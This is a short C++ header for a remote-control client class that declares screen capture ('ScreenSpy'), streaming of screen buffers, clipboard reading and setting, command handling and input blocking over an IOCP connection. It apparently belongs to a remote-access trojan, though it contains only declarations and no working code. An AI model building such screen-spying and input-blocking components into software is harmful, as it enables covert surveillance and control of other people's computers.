#pragma once
#include "Manager.h"
#include "ScreenSpy.h"
class CClientRemoteControll :
	public CManager
{
public:
	CClientRemoteControll(CIOCPClient* ClientObject);
	~CClientRemoteControll();
	virtual void CClientRemoteControll::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	VOID CClientRemoteControll::SendBitmapInfo();
	VOID CClientRemoteControll::SendFirstScreenBufferData();
	VOID CClientRemoteControll::SendNextScreenBufferData();
	static DWORD WINAPI ThreadProcedure(LPVOID ParameterData);
	VOID CClientRemoteControll::AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength);
	VOID CClientRemoteControll::SendClipboard();
	VOID CClientRemoteControll::SetClipboard(char *BufferData, ULONG BufferLength);
private:
	BOOL    m_IsLoop;
	BOOL    m_IsBlockInput;
	CScreenSpy* m_ScreenSpyObject;
	HANDLE  m_ThreadHandle;
};

